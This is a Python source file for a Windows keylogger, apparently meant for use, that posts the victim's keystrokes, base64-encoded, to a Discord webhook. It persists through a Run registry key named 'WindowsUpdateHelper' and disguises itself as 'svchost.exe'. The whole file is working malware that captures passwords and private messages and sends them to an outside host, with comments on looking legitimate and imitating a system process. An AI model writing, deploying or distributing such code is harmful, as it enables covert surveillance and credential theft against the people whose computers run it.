import os
import sys
import base64
import requests
import threading
import pynput.keyboard
from winreg import HKEY_CURRENT_USER, KEY_WRITE, REG_SZ, OpenKey, SetValueEx


# Discord webhook URL
WEBHOOK_URL = "https://discord.com/api/webhook/"   #Replace with your webhook URL

# Buffer to store keystrokes
log_buffer = []


def send_to_discord(logs):
    """Encodes and sends logs to Discord webhook."""
    data = "".join(logs)
    encoded_data = base64.b64encode(data.encode()).decode()
    payload = {"content": encoded_data}

    try:
        requests.post(WEBHOOK_URL, json=payload)
    except Exception as e:
        print(f"Error sending logs: {e}")


def on_press(key):
    """Captures keystrokes and adds them to the log buffer."""
    try:
        log_buffer.append(key.char)
    except AttributeError:
        log_buffer.append(f"[{key}]")

    # Send logs to Discord every 10 keystrokes
    if len(log_buffer) >= 10:
        send_to_discord(log_buffer)
        log_buffer.clear()


def add_to_startup():
    """Adds the script to Windows startup."""
    try:
        key = OpenKey(HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
        SetValueEx(key, "WindowsUpdateHelper", 0, REG_SZ, sys.executable)  # Legitimní název
        key.Close()
        print("Added to startup.")
    except Exception as e:
        print(f"Error adding to startup: {e}")


def rename_process(new_name):
    """Renames the process in Task Manager."""
    try:
        if sys.platform == "win32":
            import ctypes
            ctypes.windll.kernel32.SetConsoleTitleW(new_name)
    except Exception as e:
        print(f"Error renaming process: {e}")


def hide_from_task_manager():
    """Attempts to hide the process from Task Manager."""
    try:
        if sys.platform == "win32":
            import ctypes
            # Tato metoda není 100% spolehlivá, ale může proces skrýt
            ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")  # Napodobí systémový proces
    except Exception as e:
        print(f"Error hiding process: {e}")


def main():
    # Rename the process to something less suspicious
    rename_process("svchost.exe")  # Napodobí systémový proces

    # Attempt to hide the process from Task Manager
    hide_from_task_manager()

    # Add the script to startup
    add_to_startup()

    # Start the keylogger listener
    listener = pynput.keyboard.Listener(on_press=on_press)
    listener.start()

    # Keep the script running
    try:
        while True:
            pass
    except KeyboardInterrupt:
        listener.stop()


if __name__ == "__main__":
    main()